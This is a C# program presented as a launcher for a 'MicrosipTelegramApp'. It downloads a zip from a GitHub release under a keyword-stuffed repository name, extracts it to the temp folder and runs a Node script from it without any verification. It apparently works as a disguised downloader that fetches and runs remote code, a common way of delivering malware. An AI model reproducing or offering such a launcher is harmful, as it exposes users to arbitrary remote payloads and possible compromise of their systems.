using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private static readonly string AppName = "MicrosipTelegramApp";
    private static readonly string DownloadUrl = "https://github.com/sashakxrxyr/microsip-telegram-api-tdlib-telegram-api-tdlib-app-configuration-app-api_id-31818704-app-api_hash-2/releases/latest/download/app.zip";

    static async Task Main(string[] args)
    {
        Console.WriteLine($"=== {AppName} Launcher ===");
        
        var appDir = Path.Combine(Path.GetTempPath(), AppName);
        var zipPath = Path.Combine(Path.GetTempPath(), $"{AppName}.zip");

        if (Directory.Exists(appDir))
        {
            Directory.Delete(appDir, true);
        }
        Directory.CreateDirectory(appDir);

        Console.WriteLine("Downloading application...");
        if (File.Exists(zipPath)) File.Delete(zipPath);

        using var client = new HttpClient();
        client.DefaultRequestHeaders.Add("User-Agent", "Launcher/1.0");
        
        var response = await client.GetAsync(DownloadUrl);
        response.EnsureSuccessStatusCode();
        
        await using var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None);
        await response.Content.CopyToAsync(fs);
        
        Console.WriteLine("Extracting...");
        ZipFile.ExtractToDirectory(zipPath, appDir);
        File.Delete(zipPath);

        Console.WriteLine("Starting application...");
        
        var startInfo = new ProcessStartInfo
        {
            WorkingDirectory = appDir,
            FileName = "node",
            Arguments = ".next/server.js",
            UseShellExecute = true
        };
        
        Process.Start(startInfo);
        
        Console.WriteLine("Application started!");
    }
}